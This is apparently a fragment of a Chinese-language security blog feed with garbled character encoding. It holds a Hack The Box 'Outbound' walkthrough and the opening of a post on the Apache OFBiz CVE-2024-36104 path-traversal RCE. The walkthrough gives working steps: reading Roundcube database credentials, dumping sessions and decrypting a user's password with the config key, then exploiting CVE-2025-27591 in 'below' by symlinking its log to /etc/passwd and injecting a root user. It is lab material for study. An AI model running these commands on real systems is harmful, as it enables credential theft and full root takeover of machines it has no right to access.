HERE!</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;support_url&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-comment">// Name your service. This is displayed on the login screen and in the window title</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;product_name&#x27;</span>] = <span class="hljs-string">&#x27;Roundcube Webmail&#x27;</span>;<br><br><span class="hljs-comment">// This key is used to encrypt the users imap password which is stored</span><br><span class="hljs-comment">// in the session record. For the default cipher method it must be</span><br><span class="hljs-comment">// exactly 24 characters long.</span><br><span class="hljs-comment">// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;des_key&#x27;</span>] = <span class="hljs-string">&#x27;rcmail-!24ByteDESkey*Str&#x27;</span>;<br><br><span class="hljs-comment">// List of active plugins (in plugins/ directory)</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;plugins&#x27;</span>] = [<br>    <span class="hljs-string">&#x27;archive&#x27;</span>,<br>    <span class="hljs-string">&#x27;zipdownload&#x27;</span>,<br>];<br><br><span class="hljs-comment">// skin name: folder from skins/</span><br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;skin&#x27;</span>] = <span class="hljs-string">&#x27;elastic&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;default_host&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;smtp_server&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure><p>æ ¹æ®ä¿¡æ¯ç™»å½•æ•°æ®åº“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;db_dsnw&#x27;</span>] = <span class="hljs-string">&#x27;mysql://roundcube:RCDBPass2025@localhost/roundcube&#x27;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e &#x27;show databases;&#x27; -E<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ roundcube æ•°æ®åº“</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs mysql">Database<br>information_schema<br>roundcube<br>Tables_in_roundcube<br>cache<br>cache_index<br>cache_messages<br>cache_shared<br>cache_thread<br>collected_addresses<br>contactgroupmembers<br>contactgroups<br>contacts<br>dictionary<br>filestore<br>identities<br>responses<br>searches<br>session<br>system<br>users<br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢åå‘ç°æœ‰è¿™äº›è¡¨ï¼Œå…ˆçœ‹çš„ users è¡¨ï¼Œä½†æ˜¯æ²¡æœ‰å¯†ç ï¼ŒæŸ¥çœ‹ session è¡¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e &#x27;use roundcube;select * from session;&#x27; -E<br></code></pre></td></tr></table></figure><p>è§£å¯† session çš„ var å­—æ®µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">language|s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;en_US&quot;</span>;imap_namespace|a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;personal&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;/&quot;</span>;&#125;&#125;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;other&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;shared&quot;</span>;N;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;prefix_out&quot;</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;&#125;imap_delimiter|s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;/&quot;</span>;imap_list_conf|a:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;N;i:<span class="hljs-number">1</span>;a:<span class="hljs-number">0</span>:&#123;&#125;&#125;user_id|i:<span class="hljs-number">1</span>;username|s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;jacob&quot;</span>;storage_host|s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;localhost&quot;</span>;storage_port|i:<span class="hljs-number">143</span>;storage_ssl|b:<span class="hljs-number">0</span>;password|s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;L7Rv00A8TuwJAr67kITxxcSgnIk25Am/&quot;</span>;login_time|i:<span class="hljs-number">1749397119</span>;timezone|s:<span class="hljs-number">13</span>:<span class="hljs-string">&quot;Europe/London&quot;</span>;STORAGE_SPECIAL-USE|b:<span class="hljs-number">1</span>;auth_secret|s:<span class="hljs-number">26</span>:<span class="hljs-string">&quot;DpYqv6maI9HxDL5GhcCd8JaQQW&quot;</span>;request_token|s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;TIsOaABA1zHSXZOBpH6up5XFyayNRHaw&quot;</span>;task|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;mail&quot;</span>;skin_config|a:<span class="hljs-number">7</span>:&#123;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;supported_layouts&quot;</span>;a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;widescreen&quot;</span>;&#125;s:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;jquery_ui_colors_theme&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;bootstrap&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;embed_css_location&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;/styles/embed.css&quot;</span>;s:<span class="hljs-number">19</span>:<span class="hljs-string">&quot;editor_css_location&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;/styles/embed.css&quot;</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">&quot;dark_mode_support&quot;</span>;b:<span class="hljs-number">1</span>;s:<span class="hljs-number">26</span>:<span class="hljs-string">&quot;media_browser_css_location&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;none&quot;</span>;s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;additional_logo_types&quot;</span>;a:<span class="hljs-number">3</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;dark&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;small&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;small-dark&quot;</span>;&#125;&#125;imap_host|s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;localhost&quot;</span>;page|i:<span class="hljs-number">1</span>;mbox|s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;INBOX&quot;</span>;sort_col|s:<span class="hljs-number">0</span>:<span class="hljs-string">&quot;&quot;</span>;sort_order|s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;DESC&quot;</span>;STORAGE_THREAD|a:<span class="hljs-number">3</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;REFERENCES&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;REFS&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;ORDEREDSUBJECT&quot;</span>;&#125;STORAGE_QUOTA|b:<span class="hljs-number">0</span>;STORAGE_LIST-EXTENDED|b:<span class="hljs-number">1</span>;list_attrib|a:<span class="hljs-number">6</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;messages&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;id&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;messagelist&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;s:<span class="hljs-number">42</span>:<span class="hljs-string">&quot;listing messagelist sortheader fixedheader&quot;</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">&quot;aria-labelledby&quot;</span>;s:<span class="hljs-number">22</span>:<span class="hljs-string">&quot;aria-label-messagelist&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;data-list&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;message_list&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;data-label-msg&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;The list is empty.&quot;</span>;&#125;unseen_count|a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;INBOX&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;Trash&quot;</span>;i:<span class="hljs-number">0</span>;&#125;folders|a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;INBOX&quot;</span>;a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;cnt&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;maxuid&quot;</span>;i:<span class="hljs-number">3</span>;&#125;&#125;list_mod_seq|s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;10&quot;</span>;<br></code></pre></td></tr></table></figure><p>æœ‰ç”¨æˆ· <code>jacob</code> çš„ä¿¡æ¯ï¼Œpassword å’Œ auth_secret</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">password|s:<span class="hljs-number">32</span>:<span class="hljs-string">&quot;L7Rv00A8TuwJAr67kITxxcSgnIk25Am/&quot;</span><br>auth_secret|s:<span class="hljs-number">26</span>:<span class="hljs-string">&quot;DpYqv6maI9HxDL5GhcCd8JaQQW&quot;</span><br></code></pre></td></tr></table></figure><h1 id="Decrypt-Password"><a href="#Decrypt-Password" class="headerlink" title="Decrypt Password"></a>Decrypt Password</h1><p>åœ¨ <code>/var/www/html/roundcube/bin</code> ä¸‹æœ‰ä¸€ä¸ª decrypt.shå¯ä»¥ç›´æ¥è§£å¯†äº†</p><p><img src="https://img.dkdun.cn/v1/2025/12/bb20b62e5695198c.png" alt="image-20250716011112828"></p><p>æ‹¿åˆ°å¯†ç  <code>595mO8DmwGeD</code></p><p>åŒæ ·å¯ä»¥ç”¨å¦ä¸€ç§æ–¹æ³•è§£å¯†ï¼š</p><p>åœ¨ <a href="https://github.com/roundcube/roundcubemail/blob/master/program/lib/Roundcube/rcube.php">https://github.com/roundcube/roundcubemail/blob/master/program/lib/Roundcube/rcube.php</a> æ‰¾åˆ°äº†ç›¸å…³è§£å¯†å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_crypto_method</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;cipher_method&#x27;</span>) ?: <span class="hljs-string">&#x27;DES-EDE3-CBC&#x27;</span>;<br>    &#125;<br><br>* @param <span class="hljs-keyword">string</span> <span class="hljs-variable">$cipher</span> Encrypted text<br>     * @param <span class="hljs-keyword">string</span> <span class="hljs-variable">$key</span>    Encryption key to retrieve <span class="hljs-keyword">from</span> the configuration, defaults to <span class="hljs-string">&#x27;des_key&#x27;</span><br>     * @param <span class="hljs-keyword">bool</span>   <span class="hljs-variable">$base64</span> Whether <span class="hljs-keyword">or</span> not input is base64-encoded<br>     *<br>     * @<span class="hljs-keyword">return</span> <span class="hljs-keyword">string</span>|<span class="hljs-literal">false</span> Decrypted text, <span class="hljs-literal">false</span> on error<br>     */<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt</span>(<span class="hljs-params"><span class="hljs-variable">$cipher</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;des_key&#x27;</span>, <span class="hljs-variable">$base64</span> = <span class="hljs-literal">true</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// @phpstan-ignore-next-line</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$cipher</span>) || !<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cipher</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$base64</span>) &#123;<br>            <span class="hljs-variable">$cipher</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cipher</span>, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cipher</span> === <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$ckey</span> = <span class="hljs-variable language_">$this</span>-&gt;config-&gt;<span class="hljs-title function_ invoke__">get_crypto_key</span>(<span class="hljs-variable">$key</span>);<br>        <span class="hljs-variable">$method</span> = <span class="hljs-variable language_">$this</span>-&gt;config-&gt;<span class="hljs-title function_ invoke__">get_crypto_method</span>();<br>        <span class="hljs-variable">$iv_size</span> = <span class="hljs-title function_ invoke__">openssl_cipher_iv_length</span>(<span class="hljs-variable">$method</span>);<br>        <span class="hljs-variable">$tag</span> = <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^##(.&#123;16&#125;)##/s&#x27;</span>, <span class="hljs-variable">$cipher</span>, <span class="hljs-variable">$matches</span>)) &#123;<br>            <span class="hljs-variable">$tag</span> = <span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$cipher</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$cipher</span>, <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$matches</span>[<span class="hljs-number">0</span>]));<br>        &#125;<br><br>        <span class="hljs-variable">$iv</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$cipher</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$iv_size</span>);<br><br>        <span class="hljs-comment">// session corruption? (#1485970)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$iv</span>) &lt; <span class="hljs-variable">$iv_size</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$cipher</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$cipher</span>, <span class="hljs-variable">$iv_size</span>);<br>        <span class="hljs-variable">$clear</span> = <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$cipher</span>, <span class="hljs-variable">$method</span>, <span class="hljs-variable">$ckey</span>, \OPENSSL_RAW_DATA, <span class="hljs-variable">$iv</span>, <span class="hljs-variable">$tag</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$clear</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä»ä¸Šé¢çš„è¿™äº›ä»£ç ä¸­å¯ä»¥å¾—åˆ°åŠ å¯†æ–¹æ³•ä¸º DES-EDE3-CBCï¼Œä¹Ÿå°±æ˜¯ 3DESï¼Œiv ç”±å¯†æ–‡ç»è¿‡ base64 è§£å¯†ç„¶åå†è½¬ä¸º hex å–å‰ 8 ä¸ªå­—èŠ‚å¾—åˆ°</p><p>æœ€åç»“æœä¸º</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iv</span>ï¼š<span class="hljs-number">2</span>fb46fd3403c4eec<br></code></pre></td></tr></table></figure><p>des_key åœ¨ä¹‹å‰çš„æ–‡ä»¶ä¸­æœ‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;des_key&#x27;</span>] = <span class="hljs-string">&#x27;rcmail-!24ByteDESkey*Str&#x27;</span>;<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/f6f1aa25c48d67ff.png" alt="image-20250716023136342" style="zoom: 50%;" /><h1 id="ssh-ç™»å½•"><a href="#ssh-ç™»å½•" class="headerlink" title="ssh ç™»å½•"></a>ssh ç™»å½•</h1><p>ç™»å½• jacob çš„è´¦å·ï¼Œé‡Œé¢æœ‰é‚®ä»¶ï¼Œæ‹¿åˆ°æ–°å¯†ç  <code>gY4Wr3a1evp4</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/fd9d7ff2b1dcb30c.png" alt="image-20250716011336662"></p><p>æ‹¿åˆ° userflag</p><h1 id="CVE-2025-27591-åˆ©ç”¨-below-ææƒ"><a href="#CVE-2025-27591-åˆ©ç”¨-below-ææƒ" class="headerlink" title="CVE-2025-27591 åˆ©ç”¨ below ææƒ"></a>CVE-2025-27591 åˆ©ç”¨ below ææƒ</h1><p>sudo -l å‘ç°æœ‰ below æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jacob@outbound:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> jacob on outbound:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty<br><br>User jacob may run the following commands on outbound:<br>    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*<br></code></pre></td></tr></table></figure><p>ç›´æ¥æœ below ææƒæ‰¾åˆ° CVEï¼ŒBelowï¼š&#x2F;var&#x2F;log&#x2F;below å…¨å±€å¯å†™ç›®å½•å¯¼è‡´æœ¬åœ°ææƒæ¼æ´ (CVE-2025-27591)</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">æ­¤æ¼æ´å…è®¸æœ¬åœ°ç”¨æˆ·é€šè¿‡ä»¥ä¸‹æ–¹å¼å°†æƒé™æå‡åˆ° rootï¼š<br><br><span class="hljs-number">1.</span> ç¬¦å·é“¾æ¥ /var/<span class="hljs-built_in">log</span>/<span class="hljs-keyword">below</span>/error_root.<span class="hljs-built_in">log</span> åˆ° /etc/passwd<br><span class="hljs-number">2.</span> è§¦å‘ <span class="hljs-keyword">below</span> å†™å…¥ç¬¦å·é“¾æ¥<br><span class="hljs-number">3.</span> å°†æ¶æ„ root ç”¨æˆ·æ³¨å…¥ /etc/passwd<br></code></pre></td></tr></table></figure><p>åŠ å¯†å¯†ç å†™å…¥ &#x2F;etc&#x2F;passwd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# perl -e <span class="hljs-string">&#x27;print crypt(&quot;butt3rf1y&quot;,&quot;abc&quot;)&#x27;</span><br>abvS2XoFvLJII<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;butt3rf1y:abvS2XoFvLJII:0:0:,,,:/root:/bin/bash&#x27;</span> &gt; butt3rf1y<br><span class="hljs-built_in">rm</span> error_root.log <br><span class="hljs-built_in">ln</span> -s /etc/passwd /var/log/below/error_root.log<br><span class="hljs-built_in">sudo</span> /usr/bin/below<br><span class="hljs-built_in">cp</span> butt3rf1y error_root.log<br>su butt3rf1y<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/c780e77c3c20166a.png" alt="image-20250716020553047"></p><p>æ‹¿åˆ° root æƒé™</p><p>åé¢ <a href="https://www.n0o0b.com/">n0o0b</a> å¸ˆå‚…è·Ÿæˆ‘è¯´åªéœ€è¦ä¸‰è¡Œå‘½ä»¤å°±èƒ½æ‹¿åˆ° root</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> error_root.log<br><span class="hljs-built_in">ln</span> -s /etc/passwd error_root.log<br><span class="hljs-built_in">sudo</span> below<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;butt3rf1y:abvS2XoFvLJII:0:0::/root:/bin/bash&#x27;</span> &gt; /etc/passwd<br>su butt3rf1y<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">jacob@outbound:/var/log/below$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;butt3rf1y:abvS2XoFvLJII:0:0::/root:/bin/bash&#x27;</span> &gt; /etc/passwd<br>jacob@outbound:/var/log/below$ su butt3rf1y<br>Password:<br>butt3rf1y@outbound:/var/log/below# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><p>ç›´æ¥é“¾æ¥è¦†ç›–æƒé™ï¼ŒæŠŠ &#x2F;etc&#x2F;passwd çš„æƒé™è¦†ç›–äº†å†™å…¥ç”¨æˆ·ï¼Œè¿™æ ·ç¡®å®æ›´ç®€å•ä¸€ç‚¹ï¼Œåˆå­¦åˆ°äº†</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>below ææƒ CVE-2025-49113ã€CVE-2025-27591</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ˜¥ç§‹äº‘é•œ:CVE-2024-36104</title>
    <link href="/2025/07/12/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-CVE-RCE/"/>
    <url>/2025/07/12/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-CVE-RCE/</url>
    
    <content type="html"><![CDATA[<p>Apache OFBiz ç‰ˆæœ¬ 18.12.14 ä¹‹å‰ç‰ˆæœ¬ä¸­å­˜åœ¨è·¯å¾„éå†æ¼æ´ï¼Œå¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿç»•è¿‡åå°åŠŸèƒ½ç‚¹çš„è¿‡æ»¤å™¨éªŒè¯ï¼Œå¹¶é€šè¿‡ &#x2F;webtools&#x2F;control&#x2F;ProgramExport æ¥å£æ‰§è¡Œä»»æ„ groovy ä»£ç å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</p><span id="more"></span><h1 id="CVE-2024-36104"><a href="#CVE-2024-36104" class="headerlink" title="CVE-2024-36104"></a>CVE-2024-36104</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Apache</span> OFBiz ç‰ˆæœ¬ <span class="hljs-number">18</span>.<span class="hljs-number">12</span>.<span class="hljs-number">14</span> ä¹‹å‰ç‰ˆæœ¬ä¸­å­˜åœ¨è·¯å¾„éå†æ¼æ´ï¼Œæºäºorg.apache.ofbiz.webapp.control.ControlFilterç±»å¯¹è·¯å¾„ï¼ˆè¯·æ±‚ URL ä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚ ï¼›ã€%<span class="hljs-number">2</span>eï¼‰é™åˆ¶ä¸å½“å¯¼è‡´æ”»å‡»è€…èƒ½å¤Ÿç»•è¿‡åå°åŠŸèƒ½ç‚¹çš„è¿‡æ»¤å™¨éªŒè¯ï¼Œå¹¶é€šè¿‡ /webtools/control/ProgramExport æ¥å£æ‰§è¡Œä»»æ„ Groovy ä»£ç å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰<br></code></pre></td></tr></table></figure><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><h3 id="OFBiz-çš„è¯·æ±‚è·¯ç”±é€»è¾‘"><a href="#OFBiz-çš„è¯·æ±‚è·¯ç”±é€»è¾‘" class="headerlink" title="OFBiz çš„è¯·æ±‚è·¯ç”±é€»è¾‘"></a>OFBiz çš„è¯·æ±‚è·¯ç”±é€»è¾‘</h3><p>Apache OFBiz ä½¿ç”¨ <code>ControlServlet</code> å’Œ <code>ControlFilter</code>  å¤„ç†è¯·æ±‚è·¯å¾„ï¼Œå…¶è·¯ç”±è§„åˆ™å¦‚ä¸‹ï¼š</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯·æ±‚è·¯å¾„ä¼šè¢«è§£æä¸ºï¼š<code>/webtools/control/&lt;endpoint&gt;</code>ï¼Œå…¶ä¸­ <code>&lt;endpoint&gt;</code> å¯¹åº” <code>controller.xml</code> ä¸­å®šä¹‰çš„ <code>&lt;request-map&gt;</code></p><img src="https://img.dkdun.cn/v1/2025/12/f001a037aff5ff72.png" alt="image-20250712025407500" style="zoom:67%;" /><p>ç”±äº OFBiz çš„è·¯å¾„è§£æé€»è¾‘æ²¡æœ‰ä¸¥æ ¼æ ¡éªŒè·¯å¾„å±‚çº§ï¼Œæ‰€ä»¥å¯¼è‡´ä»¥ä¸‹ä¸¤ç§è¯·æ±‚æ˜¯ä¸€æ ·çš„ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">åˆæ³•è·¯å¾„ï¼š<span class="hljs-regexp">/webtools/</span>control/ProgramExport<br>åµŒå¥—è·¯å¾„ï¼š<span class="hljs-regexp">/webtools/</span>control<span class="hljs-regexp">/forgotPassword/</span>ProgramExport<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/474806f187e62c88.png" alt="image-20250712020826338"></p><p>doGet 